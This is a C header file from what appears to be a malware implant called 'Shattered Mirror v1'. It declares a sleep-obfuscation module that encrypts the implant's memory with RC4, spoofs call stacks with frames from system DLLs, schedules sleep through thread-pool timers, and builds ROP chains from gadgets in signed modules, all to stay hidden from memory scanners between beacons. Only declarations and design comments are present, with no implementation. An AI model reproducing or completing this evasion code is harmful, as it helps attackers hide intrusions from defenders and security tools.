#pragma once
/*=============================================================================
 * Shattered Mirror v1 — Sleep Obfuscation (Stack Encryption)
 *
 * 2026 Evasion Standard: While sleeping between beacons, the implant
 * must be invisible to memory scanners. We achieve this by:
 *
 *   1. Encrypting our own memory pages (RC4 via SystemFunction032)
 *   2. Scrambling the call stack with synthetic frames pointing to
 *      legitimate system DLLs (kernel32, ntdll)
 *   3. Using Thread Pool API (TpSetTimer) instead of legacy timer queues
 *      (the 2026 standard — less anomalous than CreateTimerQueueTimer)
 *   4. Decrypting only when the timer fires
 *
 * During sleep:
 *   - Memory pages are encrypted gibberish
 *   - Call stack shows only legitimate system frames
 *   - Thread appears to be a normal system worker thread
 *   - No implant strings, code, or data visible
 *
 * On wake:
 *   - Timer callback fires
 *   - ROP chain reverses: decrypt → restore stack → resume
 *===========================================================================*/

#ifndef SMIRROR_STACK_ENCRYPT_H
#define SMIRROR_STACK_ENCRYPT_H

#include "common.h"
#include "indirect_syscall.h"

/*---------------------------------------------------------------------------
 *  Configuration for sleep obfuscation
 *-------------------------------------------------------------------------*/
typedef struct _SLEEP_CONFIG {
    PVOID    pImplantBase;      /* Base address of implant memory region   */
    SIZE_T   szImplantSize;     /* Size of the memory region to encrypt    */
    DWORD    dwSleepMs;         /* Sleep duration in milliseconds          */
    BYTE     bEncKey[16];       /* RC4 encryption key (derived at runtime) */
    DWORD    dwKeyLen;          /* Length of encryption key                 */
    BOOL     bStackSpoof;       /* Enable stack frame spoofing             */
} SLEEP_CONFIG, *PSLEEP_CONFIG;

/*---------------------------------------------------------------------------
 *  RC4 encryption structure (matches USTRING for SystemFunction032)
 *-------------------------------------------------------------------------*/
typedef struct _USTRING {
    DWORD Length;
    DWORD MaximumLength;
    PVOID Buffer;
} USTRING;

/* SystemFunction032 — RC4 encrypt/decrypt from advapi32.dll */
typedef NTSTATUS(WINAPI* fnSystemFunction032)(USTRING* data, USTRING* key);

/*---------------------------------------------------------------------------
 *  Thread Pool Timer types (undocumented, for TpSetTimer approach)
 *-------------------------------------------------------------------------*/
typedef VOID (NTAPI* PTP_TIMER_CALLBACK)(
    PTP_CALLBACK_INSTANCE Instance,
    PVOID                 Context,
    PTP_TIMER             Timer
);

/*---------------------------------------------------------------------------
 *  Public API
 *-------------------------------------------------------------------------*/

/* Initialize the sleep obfuscation engine */
BOOL InitSleepObfuscation(PSLEEP_CONFIG pConfig);

/* Execute one sleep cycle: encrypt → sleep → decrypt → resume */
BOOL ObfuscatedSleep(PSLEEP_CONFIG pConfig, PSYSCALL_TABLE pSyscallTable);

/* Derive encryption key from HWID + timestamp salt */
BOOL DeriveEncryptionKey(BYTE* pKeyOut, DWORD dwKeyLen);

/* Spoof the current thread's call stack with synthetic frames */
BOOL SpoofCallStack(HANDLE hThread);

/* Restore the real call stack after wake */
BOOL RestoreCallStack(HANDLE hThread);

/*---------------------------------------------------------------------------
 *  ROP Chain Helpers
 *  Locate gadgets inside signed system DLLs for the encrypt/decrypt chain.
 *-------------------------------------------------------------------------*/

/* Find a specific gadget pattern in a module */
PVOID FindROPGadget(PVOID pModuleBase, DWORD dwModuleSize,
                    BYTE* pPattern, DWORD dwPatternLen);

/* Build the encrypt → sleep → decrypt ROP chain */
BOOL BuildROPChain(PSLEEP_CONFIG pConfig, PVOID* ppChain, DWORD* pdwChainLen);

#endif /* SMIRROR_STACK_ENCRYPT_H */
